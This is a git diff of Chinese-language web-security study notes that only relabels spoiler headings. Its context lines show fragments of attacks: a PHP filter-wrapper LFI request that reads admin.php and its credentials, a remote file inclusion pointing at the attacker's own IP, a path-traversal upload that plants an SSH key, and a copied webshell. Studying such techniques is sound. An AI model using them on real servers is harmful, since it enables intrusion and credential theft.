@@ -156,7 +156,7 @@ date: 2024-02-07
   因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELECT ，所以用前面的可能不會成功
 
   <details markdown="1">
-  <summary><span class="spoiler">因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELE…</span></summary>
+  <summary><span class="spoiler">Example</span></summary>
 
   ```sql
   # 撈資料庫名
@@ -398,7 +398,7 @@ fetch(`/getflag\)
   以下有幾個好用的 Payload
 
   <details markdown="1">
-  <summary><span class="spoiler">以下有幾個好用的 Payload</span></summary>
+  <summary><span class="spoiler">Example</span></summary>
 
   ```js
   # 簡單測試用
@@ -419,7 +419,7 @@ fetch(`/getflag\)
 - WAF / CSP / HttpOnly 繞過技巧
 
   <details markdown="1">
-  <summary><span class="spoiler">WAF / CSP / HttpOnly 繞過技巧（實戰整理）</span></summary>
+  <summary><span class="spoiler">Example</span></summary>
 
   ##### WAF 繞過
 
@@ -590,7 +590,7 @@ fetch(`/getflag\)
   2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper 是有 LFI 弱點才能用</span>
 
   <details markdown="1">
-  <summary><span class="spoiler">利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 ph…</span></summary>
+  <summary><span class="spoiler">Example</span></summary>
 
   ```bash
   $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
@@ -610,7 +610,7 @@ fetch(`/getflag\)
   以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只顯示最基本的資訊，但透過 PHP wrapper 可以讀到更多，包含後端帳密
 
   <details markdown="1">
-  <summary><span class="spoiler">以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只…</span></summary>
+  <summary><span class="spoiler">Example</span></summary>
 
   ```bash
   kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php
@@ -706,7 +706,7 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
   - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 
 <details markdown="1">
-<summary><span class="spoiler">語言/序列化/反序列化/Magic Method 對照表</span></summary>
+<summary><span class="spoiler">Table</span></summary>
 
 | 語言   | 序列化         | 反序列化       | Magic Method                             |
 | ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -805,7 +805,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 1. 在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的 ssh rsa public key ，在封包中修改
 
    <details markdown="1">
-   <summary><span class="spoiler">在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的…</span></summary>
+   <summary><span class="spoiler">Example</span></summary>
 
    ```bash
    POST /upload HTTP/1.1
@@ -915,7 +915,7 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
 ## Tools
 
 <details markdown="1">
-<summary><span class="spoiler">Fuck/Beautifier 對照表</span></summary>
+<summary><span class="spoiler">Table</span></summary>
 
 | Fuck                                                                    | Beautifier                                                                                |
 | ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------------------------------- |
